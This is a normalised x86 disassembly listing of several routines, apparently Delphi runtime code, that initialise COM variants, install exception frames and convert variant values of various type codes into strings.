mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407bb8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4046c8
jmp r-xdata
jmp r-xdata
call sub_40e230
sub_411ab4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_411b73
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411b51
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e5d4
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_40468c
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404778
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404124
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b58
lea eax [ ebp - 0x10 ]
call sub_40e978
retn
sub_411b80
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411bd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eca0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_411c68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411bdd
lea eax [ ebp - 0x10 ]
call sub_40e978
retn
sub_411be4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4133b0
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411c59
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403ef0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e978
retn
sub_411c68
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41219f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411ca1 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ef0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403e9c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403ef0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ef0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40929c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ef0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40929c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403ef0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411980
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404124
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4119b8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404124
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_40468c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404778
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404124
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_4119f0
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404124
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403ef0
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403ef0
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403ef0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407f8c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403ef0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407f8c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403ef0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411c68
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_411ab4
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403ef0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4121a6
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403ec0
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404594
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403ec0
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404594
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ec0
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_411b80
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403ef0
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403ef0
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e194
test ah 0x40
je r-xdata
mov eax esi
call sub_403e9c
mov edx eax
mov eax ebx
call sub_411be4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_411ab4
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403ef0
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_411ab4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403ef0
jmp r-xdata
jmp [ eax * 4 + jump_table_411f35 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403ef0
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403ef0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40929c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403ef0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40929c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403ef0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411980
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404124
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_4119b8
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404124
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4040c4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_4119f0
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404124
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403ef0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403ef0
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403ef0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407f8c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403ef0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407f8c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403ef0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411c68
jmp r-xdata
sub_4121ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412256
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412239
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e5d4
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_40468c
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412240
lea eax [ ebp - 0x10 ]
call sub_40e978
retn
sub_412264
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4122ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eca0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4122c1
lea eax [ ebp - 0x10 ]
call sub_40e978
retn
sub_4122c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412380
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4133b0
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412387
lea eax [ ebp - 0x20 ]
call sub_40457c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412363
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_40468c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e978
retn
sub_412390
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4128e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4123ca ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4046c8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_40457c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4046c8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4046c8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40929c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4046c8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40929c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4046c8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411980
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4045b8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4119b8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4045b8
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_40468c
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404778
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_4119f0
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4045b8
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4046c8
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4046c8
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407ea0
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4046c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407f8c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4046c8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407f8c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4046c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412390
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_4121ac
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4045b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4128e9
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404594
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403ec0
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404594
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403ec0
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404594
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403ec0
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404594
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ec0
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412264
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4045b8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4046c8
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e194
test ah 0x40
je r-xdata
mov eax esi
call sub_40457c
mov edx eax
mov eax ebx
call sub_4122c8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4121ac
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4045b8
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4121ac
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4045b8
jmp r-xdata
jmp [ eax * 4 + jump_table_412651 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4046c8
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4046c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40929c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4046c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40929c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4046c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_411980
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4045b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4119b8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4045b8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40468c
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_4119f0
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4045b8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4046c8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4046c8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407ea0
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4046c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407f8c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4046c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407f8c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4046c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412390
jmp r-xdata
sub_4128f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41295a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40eca0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412961
lea eax [ ebp - 0x10 ]
call sub_40e978
retn
mov dx 0xd
mov ax 0x101
call sub_40e194
sub_412968
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_4128f0
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405774
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405774
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_40575c
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4133b0
test al al
je r-xdata
mov eax esi
call sub_40575c
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e194
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e194
mov eax esi
call sub_40575c
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403218
test al al
jne r-xdata
sub_412a34
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_40575c
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_40575c
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e194
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405774
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405774
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4133b0
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e194
mov eax esi
call sub_40575c
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403218
test al al
jne r-xdata
sub_412ae0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e8fc
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_412b1c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8fc
sub_412b3c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40e8fc
sub_412b5c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8fc
sub_412b7c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8fc
sub_412b9c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40e8fc
sub_412bbc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8fc
sub_412bdc
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e8fc
sub_412c08
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40e8fc
sub_412c2c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e8fc
sub_412c58
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e8fc
sub_412c84
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e8fc
sub_412cb0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e8fc
sub_412d14
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ef0
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8fc
sub_412d40
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404778
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8fc
sub_412d78
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405774
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8fc
sub_412da4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405774
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8fc
sub_412f54
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41307a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403ef0
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403ef0
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4133b0
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403ef0
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041a8
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407fb4
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4041a8
